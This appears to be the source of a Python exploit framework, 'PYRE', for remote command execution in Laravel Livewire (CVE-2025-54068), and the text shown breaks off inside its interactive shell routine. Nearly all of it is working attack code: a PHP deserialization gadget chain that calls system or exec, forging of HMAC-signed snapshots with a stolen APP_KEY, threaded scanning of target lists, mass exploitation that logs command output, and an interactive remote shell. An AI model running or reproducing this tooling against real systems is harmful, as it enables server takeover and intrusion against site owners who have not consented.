#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
PYRE - Livewire RCE Exploit Framework
CVE-2025-54068 - Livewire Remote Command Execution
Based on Livepyre by Synacktiv (@_remsio_ @_Worty)

BOB MARLEY LABS
VENI | VIDI | VICI
"""

import os
import sys
import re
import json
import random
import time
import urllib3
import requests
import hmac
import hashlib
import html as html_module
from datetime import datetime
from typing import List, Dict, Optional
from urllib.parse import urlparse, unquote
from concurrent.futures import ThreadPoolExecutor, as_completed
from threading import Lock

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# Thread-safe output lock
output_lock = Lock()

# Colors
R = "\033[91m"
G = "\033[92m"
Y = "\033[93m"
B = "\033[94m"
M = "\033[95m"
C = "\033[96m"
W = "\033[97m"
RST = "\033[0m"

BANNER = f"""{C}
██████╗ ██╗   ██╗██████╗ ███████╗
██╔══██╗╚██╗ ██╔╝██╔══██╗██╔════╝
██████╔╝ ╚████╔╝ ██████╔╝█████╗  
██╔═══╝   ╚██╔╝  ██╔══██╗██╔══╝  
██║        ██║   ██║  ██║███████╗
╚═╝        ╚═╝   ╚═╝  ╚═╝╚══════╝{RST}

{Y}Livewire RCE Exploit Framework{RST}
{R}CVE-2025-54068{RST} | {G}Bob Marley Labs{RST}
{C}Based on Livepyre by Synacktiv{RST}
"""

# Load payload template from payload.json
def load_payload_template():
    """Load payload from payload.json file"""
    try:
        # Try exploit/payload.json first
        payload_path = os.path.join(os.path.dirname(__file__), 'exploit', 'payload.json')
        if not os.path.exists(payload_path):
            payload_path = os.path.join(os.path.dirname(__file__), 'payload.json')
        with open(payload_path, 'r', encoding='utf-8') as f:
            return json.load(f)
    except:
        # Fallback embedded payload if file not found
        return {
            "_token": "",
            "components": [{
                "snapshot": "",
                "updates": {
                    "TARGET": [
                        1,
                        [{
                            "a": [{
                                "__toString": "phpversion",
                                "close": [[
                                    [{
                                        "chained": [
                                            'O:38:"Illuminate\\Broadcasting\\BroadcastEvent":4:{s:5:"dummy";O:40:"Illuminate\\Broadcasting\\PendingBroadcast":2:{s:9:"\u0000*\u0000events";O:31:"Illuminate\\Validation\\Validator":1:{s:10:"extensions";a:1:{s:0:"";s:[FUNCTION_LEN]:"[FUNCTION]";}}s:8:"\u0000*\u0000event";s:[PARAM_LEN]:"[PARAM]";}s:10:"connection";N;s:5:"queue";N;s:5:"event";O:37:"Illuminate\\Notifications\\Notification":0:{}}'
                                        ]
                                    }, {
                                        "s": "form",
                                        "class": "Illuminate\\Broadcasting\\BroadcastEvent"
                                    }],
                                    "dispatchNextJobInChain"
                                ], {
                                    "s": "clctn",
                                    "class": "Laravel\\SerializableClosure\\Serializers\\Signed"
                                }]
                            }, {
                                "s": "clctn",
                                "class": "GuzzleHttp\\Psr7\\FnStream"
                            }],
                            "b": [{
                                "__toString": [[[
                                    None, {
                                        "s": "mdl",
                                        "class": "Laravel\\Prompts\\Terminal"
                                    }
                                ], "exit"], {
                                    "s": "clctn",
                                    "class": "Laravel\\SerializableClosure\\Serializers\\Signed"
                                }]
                            }, {
                                "s": "clctn",
                                "class": "GuzzleHttp\\Psr7\\FnStream"
                            }]
                        }, {
                            "class": "League\\Flysystem\\UrlGeneration\\ShardedPrefixPublicUrlGenerator",
                            "s": "clctn"
                        }]
                    ]
                },
                "calls": []
            }]
        }

PAYLOAD_TEMPLATE = load_payload_template()

# ==================== URL NORMALIZATION ====================
def normalize_url(url: str) -> str:
    """Normalize URL to standard format"""
    url = url.strip()
    
    if not url.startswith(('http://', 'https://')):
        if re.match(r'^\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}', url):
            url = f"http://{url}"
        else:
            url = f"https://{url}"
    
    try:
        parsed = urlparse(url)
        base_url = f"{parsed.scheme}://{parsed.netloc}"
        return base_url
    except:
        return url.rstrip('/')


# ==================== LIVEWIRE EXPLOIT CLASS ====================
class LivewireExploit:
    def __init__(self, timeout=10):
        self.timeout = timeout
        self.session = requests.Session()
        self.session.verify = False
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
            'Accept': 'application/json',
            'Content-Type': 'application/json',
        })
    
    def get_csrf_token(self, html_content):
        """Extract CSRF token from page - multiple methods"""
        patterns = [
            # Livewire data-csrf attribute
            (r'data-csrf="([^"]+)"', 1),
            # Laravel meta tag (most common)
            (r'<meta\s+name="csrf-token"\s+content="([^"]+)"', 1),
            (r'<meta\s+content="([^"]+)"\s+name="csrf-token"', 1),
            # Livewire script config
            (r'"csrf"\s*:\s*"([^"]+)"', 1),
            # _token input field
            (r'<input[^>]+name="_token"[^>]+value="([^"]+)"', 1),
            (r'<input[^>]+value="([^"]+)"[^>]+name="_token"', 1),
            # XSRF-TOKEN cookie fallback
            (r'XSRF-TOKEN=([^;]+)', 1),
        ]
        
        for pattern, group in patterns:
            match = re.search(pattern, html_content, re.IGNORECASE)
            if match:
                token = match.group(group)
                # Decode URL-encoded token if needed
                if '%' in token:
                    token = unquote(token)
                return token
        
        # Try livewireScriptConfig JSON parsing
        if "livewireScriptConfig" in html_content:
            try:
                config_start = html_content.find("livewireScriptConfig = ") + len("livewireScriptConfig = ")
                config_end = html_content.find(";", config_start)
                config = json.loads(html_content[config_start:config_end])
                if "csrf" in config:
                    return config["csrf"]
            except:
                pass
        
        return None
    
    def get_update_uri(self, html_content):
        """Extract Livewire update URI from page"""
        if "livewireScriptConfig" in html_content:
            try:
                config = json.loads(html_content.split("livewireScriptConfig = ")[1].split(";")[0])
                uri = config.get("uri", "/livewire/update")
                # Remove leading slash
                return uri[1:] if uri.startswith("/") else uri
            except:
                pass
        
        if "data-update-uri" in html_content:
            potential_uri = html_content.split('data-update-uri="')[1].split('"')[0]
            if "http" in potential_uri:
                return potential_uri
            else:
                return potential_uri[1:] if potential_uri.startswith("/") else potential_uri
        
        # Default fallback
        return "livewire/update"
    
    def check_array_param(self, snapshot_params):
        """Check for object-type parameters in snapshot"""
        ret = None
        strict_synth = ["str", "std", "int", "float", "mdl"]
        for param in snapshot_params.keys():
            try:
                for entry in snapshot_params[param]:
                    try:
                        if entry.get('s') and entry['s'] not in strict_synth:
                            ret = param
                            break
                    except:
                        continue
            except:
                continue
            if ret is not None:
                break
        return ret
    
    # ==================== EXPLOIT WITHOUT APP_KEY ====================
    def exploit_without_appkey(self, target: str, function: str = "system", param: str = "id", verbose: bool = False) -> Optional[str]:
        """
        Exploit Livewire WITHOUT APP_KEY
        CVE-2025-54068
        """
        try:
            response = self.session.get(target, timeout=self.timeout)
            page_content = response.text
            
            # Extract CSRF token
            csrf_token = self.get_csrf_token(page_content)
            if not csrf_token:
                if verbose:
                    print(f"{R}[!]{RST} CSRF token not found")
                return None
            
            if verbose:
                print(f"{G}[+]{RST} CSRF: {csrf_token[:20]}...")
            
            # Extract update URI
            update_uri = self.get_update_uri(page_content)
            if not update_uri:
                if verbose:
                    print(f"{R}[!]{RST} Update URI not found")
                return None
            
            if verbose:
                print(f"{G}[+]{RST} Update URI: {update_uri}")
            
            # Extract snapshots
            snapshots = re.findall(r'wire:snapshot="([^"]*)"', page_content)
            if not snapshots:
                if verbose:
                    print(f"{R}[!]{RST} No snapshots found")
                return None
            
            if verbose:
                print(f"{G}[+]{RST} Found {len(snapshots)} snapshot(s)")
            
            # Build update URL
            parsed = urlparse(target)
            base_url = f"{parsed.scheme}://{parsed.netloc}/"
            update_url = base_url + update_uri if not update_uri.startswith(("http://", "https://")) else update_uri
            
            # Try each snapshot
            for snapshot_raw in snapshots:
                try:
                    snapshot_content = json.loads(html_module.unescape(snapshot_raw))
                    
                    if not snapshot_content.get('data') or len(snapshot_content['data']) == 0:
                        continue
                    
                    params = list(snapshot_content['data'].keys())
                    if verbose:
                        print(f"{G}[+]{RST} Found {len(params)} parameter(s)")
                    
                    # Check for object type parameters
                    target_param = self.check_array_param(snapshot_content['data'])
                    
                    if target_param:
                        if verbose:
                            print(f"{G}[+]{RST} Found object param: {target_param}")
                        new_snapshot = json.dumps(snapshot_content)
                    else:
                        # Bruteforce - stage 1: cast param to array
                        target_param = params[0]
                        if verbose:
                            print(f"{Y}[*]{RST} Trying param: {target_param}")
                        
                        stage1_payload = {
                            "_token": csrf_token,
                            "components": [{
                                "snapshot": json.dumps(snapshot_content),
                                "updates": {target_param: []},
                                "calls": []
                            }]
                        }
                        
                        s1_response = self.session.post(update_url, json=stage1_payload, timeout=self.timeout)
                        if s1_response.status_code != 200:
                            if verbose:
                                print(f"{R}[STAGE1 FAILED]{RST} HTTP {s1_response.status_code}")
                            continue
                        
                        try:
                            new_snapshot = s1_response.json()["components"][0]["snapshot"]
                            if verbose:
                                print(f"{G}[STAGE1 OK]{RST} Snapshot casted to array")
                        except Exception as e:
                            if verbose:
                                print(f"{R}[STAGE1 FAILED]{RST} Can't parse response: {str(e)}")
                            continue
                    
                    # Stage 2: Trigger RCE with payload template
                    json_payload = json.loads(json.dumps(PAYLOAD_TEMPLATE))
                    json_payload["_token"] = csrf_token
                    json_payload["components"][0]["snapshot"] = new_snapshot
                    
                    # Replace TARGET with actual param name
                    updated_payload = json_payload["components"][0]["updates"]
                    updated_payload[target_param] = updated_payload.pop("TARGET")
                    
                    # Build user payload
                    user_payload = json_payload["components"][0]["updates"][target_param][1][0]["a"][0]["close"][0][0][0]["chained"][0]
                    user_payload = user_payload.replace("[FUNCTION_LEN]", str(len(function)))
                    user_payload = user_payload.replace("[FUNCTION]", function)
                    user_payload = user_payload.replace("[PARAM_LEN]", str(len(param)))
                    user_payload = user_payload.replace("[PARAM]", param)
                    json_payload["components"][0]["updates"][target_param][1][0]["a"][0]["close"][0][0][0]["chained"][0] = user_payload
                    
                    if verbose:
                        print(f"{C}[*]{RST} Sending payload: {function}('{param}')")
                    
                    s2_response = self.session.post(update_url, json=json_payload, timeout=self.timeout)
                    
                    if verbose:
                        print(f"{Y}[DEBUG]{RST} Status: {s2_response.status_code}, Length: {len(s2_response.text)}")
                    
                    # Check for error responses
                    if s2_response.status_code != 200:
                        if verbose:
                            print(f"{R}[FAILED]{RST} HTTP {s2_response.status_code}")
                            print(f"{Y}[RESPONSE]{RST} {s2_response.text[:200]}")
                        continue
                    
                    # Check if snapshot is in response (means exploit failed)
                    if '"snapshot"' in s2_response.text:
                        if verbose:
                            print(f"{R}[FAILED]{RST} Server returned snapshot (exploit failed)")
                            print(f"{Y}[HINT]{RST} This usually means the payload was rejected")
                        continue
                    
                    output = s2_response.text.strip()
                    
                    # Filter out HTML responses (false positives)
                    if output.startswith('<!DOCTYPE') or output.startswith('<html') or '<head>' in output[:200]:
                        if verbose:
                            print(f"{R}[FAILED]{RST} Returned HTML instead of command output")
                            print(f"{Y}[RESPONSE]{RST} {output[:200]}")
                        continue
                    
                    # Check for empty response
                    if not output:
                        if verbose:
                            print(f"{R}[FAILED]{RST} Empty response")
                        continue
                    
                    # Check for static/maintenance responses
                    if len(output) < 50 and output.upper() == output:
                        # Likely a static error message like "MAINTANCE"
                        if verbose:
                            print(f"{Y}[WARNING]{RST} Got static response: {output}")
                            print(f"{Y}[WARNING]{RST} This might be a maintenance page or error")
                    
                    if verbose:
                        print(f"{G}[SUCCESS]{RST} Got response (may not be actual RCE)")
                        print(f"{G}[OUTPUT]{RST} {output[:200]}")
                    return output
                
                except Exception as e:
                    if verbose:
                        print(f"{R}[!]{RST} Exploit attempt failed: {str(e)}")
                        import traceback
                        traceback.print_exc()
                    continue
            
            if verbose:
                print(f"{R}[!]{RST} Exploitation failed on all snapshots")
            return None
            
        except Exception as e:
            if verbose:
                import traceback
                print(f"{R}[!]{RST} Exploit error: {e}")
                print(f"{R}[DEBUG]{RST} Traceback:")
                traceback.print_exc()
            return None
    
    # ==================== EXPLOIT WITH APP_KEY ====================
    def exploit_with_appkey(self, target: str, app_key: str, function: str = "system", param: str = "id", verbose: bool = False) -> Optional[str]:
        """
        Exploit Livewire WITH APP_KEY
        Signed snapshot method
        """
        try:
            response = self.session.get(target, timeout=self.timeout)
            page_content = response.text
            
            if verbose:
                print(f"{C}[*]{RST} Page size: {len(page_content)} bytes")
            
            # Extract CSRF token
            csrf_token = self.get_csrf_token(page_content)
            if not csrf_token:
                if verbose:
                    print(f"{R}[!]{RST} CSRF token not found")
                    print(f"{Y}[DEBUG]{RST} Has 'livewire' in page: {'livewire' in page_content.lower()}")
                    print(f"{Y}[TIP]{RST} Make sure URL points to a Livewire page with forms/components")
                return None
            
            if verbose:
                print(f"{G}[+]{RST} CSRF token: {csrf_token[:20]}...")
            
            # Extract update URI
            update_uri = self.get_update_uri(page_content)
            if not update_uri:
                if verbose:
                    print(f"{R}[!]{RST} Update URI not found")
                return None
            
            if verbose:
                print(f"{G}[+]{RST} Update URI: {update_uri}")
            
            # Extract snapshots
            snapshots = re.findall(r'wire:snapshot="([^"]*)"', page_content)
            if not snapshots:
                if verbose:
                    print(f"{R}[!]{RST} No snapshots found")
                return None
            
            if verbose:
                print(f"{G}[+]{RST} Found {len(snapshots)} snapshot(s)")
            
            # Build update URL
            parsed = urlparse(target)
            base_url = f"{parsed.scheme}://{parsed.netloc}/"
            update_url = base_url + update_uri if not update_uri.startswith(("http://", "https://")) else update_uri
            
            # Parse APP_KEY
            if app_key.startswith('base64:'):
                import base64
                parsed_key = base64.b64decode(app_key[7:])
            else:
                parsed_key = app_key.encode()
            
            # Try each snapshot
            for snapshot_raw in snapshots:
                try:
                    snapshot_content = json.loads(html_module.unescape(snapshot_raw))
                    snapshot_content.pop("checksum", None)
                    
                    if not snapshot_content.get("data") or len(snapshot_content.get('data').keys()) == 0:
                        continue
                    
                    # Get first param
                    first_arg = list(snapshot_content['data'].keys())[0]
                    
                    # Build gadget chain
                    gadget_chain = f'O:38:"Illuminate\\\\Broadcasting\\\\BroadcastEvent":4:{{s:5:"dummy";O:40:"Illuminate\\\\Broadcasting\\\\PendingBroadcast":2:{{s:9:"\\x00*\\x00events";O:31:"Illuminate\\\\Validation\\\\Validator":1:{{s:10:"extensions";a:1:{{s:0:"";s:{len(function)}:"{function}";}}}}s:8:"\\x00*\\x00event";s:{len(param)}:"{param}";}}s:10:"connection";N;s:5:"queue";N;s:5:"event";O:37:"Illuminate\\\\Notifications\\\\Notification":0:{{}}}}'
                    
                    # Build snapshot payload
                    snapshot_content['data'][first_arg] = [{
                        "a": [{
                            "__toString": "phpversion",
                            "close": [[[{
                                "chained": [gadget_chain]
                            }, {
                                "s": "form",
                                "class": "Illuminate\\Broadcasting\\BroadcastEvent"
                            }], "dispatchNextJobInChain"], {
                                "s": "clctn",
                                "class": "Laravel\\SerializableClosure\\Serializers\\Signed"
                            }]
                        }, {
                            "s": "clctn",
                            "class": "GuzzleHttp\\Psr7\\FnStream"
                        }],
                        "b": [{
                            "__toString": [[[None, {
                                "s": "mdl",
                                "class": "Laravel\\Prompts\\Terminal"
                            }], "exit"], {
                                "s": "clctn",
                                "class": "Laravel\\SerializableClosure\\Serializers\\Signed"
                            }]
                        }, {
                            "s": "clctn",
                            "class": "GuzzleHttp\\Psr7\\FnStream"
                        }]
                    }, {
                        "class": "League\\Flysystem\\UrlGeneration\\ShardedPrefixPublicUrlGenerator",
                        "s": "clctn"
                    }]
                    
                    # Calculate checksum
                    snapshot_str = json.dumps(snapshot_content).replace(" ", "").replace("/", "\\/")
                    h = hmac.new(parsed_key, snapshot_str.encode("utf-8"), hashlib.sha256)
                    snapshot_content['checksum'] = str(h.hexdigest())
                    
                    # Build payload
                    payload = {
                        "_token": csrf_token,
                        "components": [{
                            "snapshot": json.dumps(snapshot_content).replace(" ", "").replace("/", "\\/"),
                            "updates": {},
                            "calls": []
                        }]
                    }
                    
                    if verbose:
                        print(f"{C}[*]{RST} Sending payload: {function}('{param}')")
                    
                    response = self.session.post(update_url, json=payload, timeout=self.timeout)
                    
                    if response.status_code == 200:
                        output = response.text.strip()
                        
                        # Filter out HTML responses (false positives)
                        if output.startswith('<!DOCTYPE') or output.startswith('<html') or '<head>' in output[:200]:
                            if verbose:
                                print(f"{R}[FAILED]{RST} Returned HTML instead of command output")
                            continue
                        
                        if verbose:
                            print(f"{G}[SUCCESS]{RST} RCE works!")
                        return output
                
                except Exception as e:
                    if verbose:
                        print(f"{R}[!]{RST} Exploit attempt failed: {str(e)[:50]}")
                    continue
            
            if verbose:
                print(f"{R}[!]{RST} Exploitation failed on all snapshots")
            return None
            
        except Exception as e:
            if verbose:
                print(f"{R}[!]{RST} Exploit error: {e}")
            return None


# ==================== SCANNER ====================
class LivewireScanner:
    def __init__(self, timeout=10):
        self.timeout = timeout
        self.session = requests.Session()
        self.session.verify = False
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
        })
    
    def detect_livewire(self, target: str) -> Optional[Dict]:
        """Detect ACTUAL Livewire installation (strict checks)"""
        try:
            response = self.session.get(target, timeout=self.timeout)
            page_content = response.text
            page_lower = page_content.lower()
            
            # STRICT: Must have at least ONE of these strong indicators
            strong_indicators = [
                'wire:snapshot' in page_lower,                    # Component snapshots
                'livewireScriptConfig' in page_content,           # Livewire config
                '/livewire/livewire.js' in page_lower,            # Livewire script
                'window.livewire' in page_lower,                  # Livewire object
                'livewire:load' in page_lower,                    # Livewire event
                'wire:id=' in page_lower,                         # Component ID
            ]
            
            if not any(strong_indicators):
                return None
            
            # Additional verification: check for CSRF (required for exploitation)
            has_csrf = False
            csrf_patterns = [
                'csrf-token',
                '_token',
                'data-csrf',
                'XSRF-TOKEN'
            ]
            has_csrf = any(pattern in page_lower for pattern in csrf_patterns)
            
            # Check for snapshots specifically
            has_snapshot = 'wire:snapshot' in page_lower
            
            # Try to find version
            version = 'unknown'
            version_match = re.search(r'livewire.*?v?(\d+\.\d+\.\d+)', page_content, re.IGNORECASE)
            if version_match:
                version = version_match.group(1)
            
            # Only return if we have strong evidence + CSRF
            if has_csrf:
                return {
                    'target': target,
                    'version': version,
                    'has_snapshot': has_snapshot,
                    'has_csrf': has_csrf,
                    'cve': 'CVE-2025-54068'
                }
            
            return None
            
        except Exception as e:
            return None


def scan_targets(scanner: LivewireScanner):
    """Option 1: Scan targets for Livewire"""
    target_file = input(f"{C}[?]{RST} Target list file path: ").strip()
    
    if not os.path.exists(target_file):
        print(f"{R}[!]{RST} File not found: {target_file}\n")
        return
    
    threads = input(f"{C}[?]{RST} Threads (default 10): ").strip()
    threads = int(threads) if threads else 10
    
    try:
        with open(target_file, 'r', encoding='utf-8', errors='ignore') as f:
            targets = [normalize_url(line.strip()) for line in f if line.strip()]
    except Exception as e:
        print(f"{R}[ERROR]{RST} Reading file: {e}\n")
        return
    
    timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
    output_dir = f"Pyre_Results_{timestamp}"
    os.makedirs(output_dir, exist_ok=True)
    output_file = os.path.join(output_dir, "Livewire_Vulnerable.txt")
    
    print(f"\n{C}[*]{RST} Scanning {len(targets)} targets with {threads} threads...\n")
    
    vulnerable = []
    completed = 0
    
    with open(output_file, 'w', encoding='utf-8') as f:
        # Simple format: only base URLs, one per line
        
        def scan_single(target):
            nonlocal completed
            result = scanner.detect_livewire(target)
            completed += 1
            
            if completed % 10 == 0:
                print(f"{Y}[PROGRESS]{RST} {completed}/{len(targets)} | Found: {len(vulnerable)}")
            
            if result:
                # Only save if has BOTH snapshot AND CSRF
                if result.get('has_snapshot') and result.get('has_csrf'):
                    with output_lock:
                        print(f"{G}[VULN]{RST} [SNAP+CSRF] {target}")
                        vulnerable.append(result)
                        
                        # Write only base URL, one per line
                        f.write(f"{target}\n")
                        f.flush()
                else:
                    # Show but don't save
                    snapshot_marker = "[SNAP]" if result.get('has_snapshot') else "[NO-SNAP]"
                    csrf_marker = "[CSRF]" if result.get('has_csrf') else "[NO-CSRF]"
                    print(f"{Y}[SKIP]{RST} {snapshot_marker} {csrf_marker} {target}")
            
            return result
        
        with ThreadPoolExecutor(max_workers=threads) as executor:
            futures = [executor.submit(scan_single, target) for target in targets]
            for future in as_completed(futures):
                try:
                    future.result()
                except:
                    pass
    
    print(f"\n{G}[+]{RST} Scan complete!")
    print(f"{G}[+]{RST} Scanned: {completed}/{len(targets)}")
    print(f"{G}[+]{RST} Exploitable (Snapshot + CSRF): {len(vulnerable)}")
    print(f"{G}[+]{RST} Results saved: {output_file}\n")
    print(f"{C}[INFO]{RST} Output format: One URL per line (exploitable targets only)\n")


# ==================== MENU FUNCTIONS ====================
def show_menu():
    """Display main menu"""
    print(BANNER)
    print(f"{G}[1]{RST} Scan targets for Livewire")
    print(f"{G}[2]{RST} Exploit WITHOUT APP_KEY")
    print(f"{G}[3]{RST} Exploit WITH APP_KEY")
    print(f"{G}[4]{RST} Single Interactive Shell (No Key)")
    print(f"{G}[5]{RST} Single Interactive Shell (With Key)")
    print(f"{R}[0]{RST} Exit\n")

def show_exploit_submenu():
    """Display exploit mode submenu"""
    print(f"\n{C}[?]{RST} Choose mode:")
    print(f"{G}[1]{RST} Single target")
    print(f"{G}[2]{RST} Mass targets")
    print(f"{R}[0]{RST} Back to main menu\n")
    choice = input(f"{C}[?]{RST} Select option: ").strip()
    return choice


def exploit_single_without_key(scanner: LivewireExploit):
    """Option 2: Single target WITHOUT APP_KEY"""
    target = input(f"{C}[?]{RST} Target URL: ").strip()
    
    if not target:
        print(f"{R}[!]{RST} Target required\n")
        return
    
    target = normalize_url(target)
    
    print(f"{Y}[TIP]{RST} Make sure the URL has Livewire components (not 404 page)")
    print(f"{Y}[TIP]{RST} Try homepage (/) or pages with forms/interactive elements\n")
    
    command = input(f"{C}[?]{RST} Command (default: id): ").strip()
    command = command if command else "id"
    
    # Auto-try all functions
    functions = ["system", "passthru", "exec", "shell_exec"]
    
    print(f"\n{C}[*]{RST} Exploiting {target}...")
    print(f"{C}[*]{RST} Command: {command}")
    print(f"{C}[*]{RST} Auto-trying functions: {', '.join(functions)}\n")
    
    for func in functions:
        print(f"{C}[TRYING]{RST} Function: {func}")
        output = scanner.exploit_without_appkey(target, func, command, verbose=True)
        
        if output and not output.startswith('<!DOCTYPE'):
            print(f"\n{G}[+]{RST} RCE SUCCESSFUL WITH: {func}")
            print(f"{G}[OUTPUT]{RST}\n{output}\n")
            return
        print()
    
    print(f"{R}[!]{RST} All functions failed")
    print(f"{Y}[TIP]{RST} Try the homepage: {target}/\n")


def exploit_mass_without_key(scanner: LivewireExploit):
    """Option 3: Mass targets WITHOUT APP_KEY"""
    target_file = input(f"{C}[?]{RST} Target list file path: ").strip()
    
    if not os.path.exists(target_file):
        print(f"{R}[!]{RST} File not found: {target_file}\n")
        return
    
    command = input(f"{C}[?]{RST} Command (default: id): ").strip()
    command = command if command else "id"
    
    try:
        with open(target_file, 'r', encoding='utf-8', errors='ignore') as f:
            targets = [normalize_url(line.strip()) for line in f if line.strip()]
    except Exception as e:
        print(f"{R}[ERROR]{RST} Reading file: {e}\n")
        return
    
    timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
    output_dir = f"Pyre_Results_{timestamp}"
    os.makedirs(output_dir, exist_ok=True)
    output_file = os.path.join(output_dir, "Livewire_RCE_NoKey.txt")
    
    # Auto-try all functions
    functions = ["system", "passthru", "exec", "shell_exec"]
    
    print(f"\n{C}[*]{RST} Exploiting {len(targets)} targets...")
    print(f"{C}[*]{RST} Command: {command}")
    print(f"{C}[*]{RST} Auto-trying functions: {', '.join(functions)}\n")
    
    successful = 0
    
    with open(output_file, 'w', encoding='utf-8') as f:
        f.write("=" * 80 + "\n")
        f.write("LIVEWIRE RCE (WITHOUT APP_KEY)\n")
        f.write(f"CVE: CVE-2025-54068\n")
        f.write(f"Command: {command}\n")
        f.write(f"Functions: {', '.join(functions)}\n")
        f.write("=" * 80 + "\n\n")
        
        for i, target in enumerate(targets, 1):
            print(f"{C}[{i}/{len(targets)}]{RST} {target}")
            
            # Try all functions until one works
            rce_found = False
            is_verbose = (i <= 3)  # Verbose for first 3 targets only
            
            for func in functions:
                output = scanner.exploit_without_appkey(target, func, command, verbose=is_verbose)
                
                if output and not (output.startswith('<!DOCTYPE') or output.startswith('<html')):
                    print(f"{G}[SUCCESS]{RST} Function: {func} | {output[:80]}")
                    successful += 1
                    rce_found = True
                    
                    f.write(f"Target: {target}\n")
                    f.write(f"Function: {func}\n")
                    f.write(f"Command: {command}\n")
                    f.write(f"Output:\n{output}\n")
                    f.write("\n" + "-" * 60 + "\n\n")
                    f.flush()
                    break  # Stop trying other functions if one works
            
            if not rce_found:
                print(f"{R}[FAILED]{RST} All functions failed")
            
            print()
    
    print(f"{G}[+]{RST} Exploitation complete!")
    print(f"{G}[+]{RST} Successful: {successful}/{len(targets)}")
    print(f"{G}[+]{RST} Results saved: {output_file}\n")


def exploit_single_with_key(scanner: LivewireExploit):
    """Option 4: Single target WITH APP_KEY"""
    target = input(f"{C}[?]{RST} Target URL: ").strip()
    
    if not target:
        print(f"{R}[!]{RST} Target required\n")
        return
    
    target = normalize_url(target)
    
    app_key = input(f"{C}[?]{RST} APP_KEY (base64:...): ").strip()
    
    if not app_key:
        print(f"{R}[!]{RST} APP_KEY required\n")
        return
    
    command = input(f"{C}[?]{RST} Command (default: id): ").strip()
    command = command if command else "id"
    
    # Auto-try all functions
    functions = ["system", "passthru", "exec", "shell_exec"]
    
    print(f"\n{C}[*]{RST} Exploiting {target}...")
    print(f"{C}[*]{RST} APP_KEY: {app_key[:20]}...")
    print(f"{C}[*]{RST} Command: {command}")
    print(f"{C}[*]{RST} Auto-trying functions: {', '.join(functions)}\n")
    
    for func in functions:
        print(f"{C}[TRYING]{RST} Function: {func}")
        output = scanner.exploit_with_appkey(target, app_key, func, command, verbose=True)
        
        if output:
            print(f"\n{G}[+]{RST} RCE SUCCESSFUL WITH: {func}")
            print(f"{G}[OUTPUT]{RST}\n{output}\n")
            return
        print()
    
    print(f"{R}[!]{RST} All functions failed\n")


def exploit_mass_with_key(scanner: LivewireExploit):
    """Option 5: Mass targets WITH APP_KEY"""
    target_file = input(f"{C}[?]{RST} Target list file path: ").strip()
    
    if not os.path.exists(target_file):
        print(f"{R}[!]{RST} File not found: {target_file}\n")
        return
    
    app_key = input(f"{C}[?]{RST} APP_KEY (base64:...): ").strip()
    
    if not app_key:
        print(f"{R}[!]{RST} APP_KEY required\n")
        return
    
    command = input(f"{C}[?]{RST} Command (default: id): ").strip()
    command = command if command else "id"
    
    # Auto-try all functions
    functions = ["system", "passthru", "exec", "shell_exec"]
    
    try:
        with open(target_file, 'r', encoding='utf-8', errors='ignore') as f:
            targets = [normalize_url(line.strip()) for line in f if line.strip()]
    except Exception as e:
        print(f"{R}[ERROR]{RST} Reading file: {e}\n")
        return
    
    timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
    output_dir = f"Pyre_Results_{timestamp}"
    os.makedirs(output_dir, exist_ok=True)
    output_file = os.path.join(output_dir, "Livewire_RCE_WithKey.txt")
    
    print(f"\n{C}[*]{RST} Exploiting {len(targets)} targets...")
    print(f"{C}[*]{RST} Command: {command}")
    print(f"{C}[*]{RST} Auto-trying functions: {', '.join(functions)}\n")
    
    successful = 0
    
    with open(output_file, 'w', encoding='utf-8') as f:
        f.write("=" * 80 + "\n")
        f.write("LIVEWIRE RCE (WITH APP_KEY)\n")
        f.write(f"CVE: CVE-2025-54068\n")
        f.write(f"APP_KEY: {app_key[:20]}...\n")
        f.write(f"Command: {command}\n")
        f.write(f"Functions: {', '.join(functions)}\n")
        f.write("=" * 80 + "\n\n")
        
        for i, target in enumerate(targets, 1):
            print(f"{C}[{i}/{len(targets)}]{RST} {target}")
            
            # Try all functions until one works
            rce_found = False
            
            for func in functions:
                output = scanner.exploit_with_appkey(target, app_key, func, command, verbose=False)
                
                if output and not (output.startswith('<!DOCTYPE') or output.startswith('<html')):
                    print(f"{G}[SUCCESS]{RST} Function: {func} | {output[:80]}")
                    successful += 1
                    rce_found = True
                    
                    f.write(f"Target: {target}\n")
                    f.write(f"Function: {func}\n")
                    f.write(f"Command: {command}\n")
                    f.write(f"Output:\n{output}\n")
                    f.write("\n" + "-" * 60 + "\n\n")
                    f.flush()
                    break  # Stop trying other functions if one works
            
            if not rce_found:
                print(f"{R}[FAILED]{RST} All functions failed")
            
            print()
    
    print(f"{G}[+]{RST} Exploitation complete!")
    print(f"{G}[+]{RST} Successful: {successful}/{len(targets)}")
    print(f"{G}[+]{RST} Results saved: {output_file}\n")


def interactive_shell_without_key(scanner: LivewireExploit):
    """Option 4: Interactive shell WITHOUT APP_KEY"""
    target = input(f"{C}[?]{RST} Target URL: ").strip()
    
    if not target:
        print(f"{R}[!]{RST} Target required\n")
        return
    
    target = normalize_url(target)
    
    print(f"{Y}[TIP]{RST} Make sure the URL has Livewire components")
    print(f"{Y}[TIP]{RST} Type 'exit' to quit shell\n")
    
    # Auto-detect working function
    functions = ["system", "passthru", "exec", "shell_exec"]
    working_function = None
    
    print(f"{C}[*]{RST} Auto-detecting working function...")
    for func in functions:
        print(f"{C}[TRYING]{RST} {func}... ", end='')
        output = scanner.exploit_without_appkey(target, func, "echo PYRE_TEST", verbose=False)
        if output and "PYRE_TEST" in output:
            print(f"{G}OK{RST}")
            working_function = func
            break
        print(f"{R}FAILED{RST}")
    
    if not working_function:
        print(f"\n{R}[!]{RST} No working function found. Shell unavailable.\n")
        return
    
    print(f"\n{G}[+]{RST} Starting interactive shell on {target}")
    print(f"{G}[+]{RST} Using function: {working_function}\n")
    
    first_command = False
    
    while True:
        try:
            command = input(f"{C}Pyre>{RST} ").strip()
            
            if not command:
                continue
            
            if command.lower() in ['exit', 'quit', 'q']:
                print(f"\n{Y}[*]{RST} Exiting shell...\n")
                break
            
            # Use the working function
            output = scanner.exploit_without_appkey(target, working_function, command, verbose=False)
            
            if output:
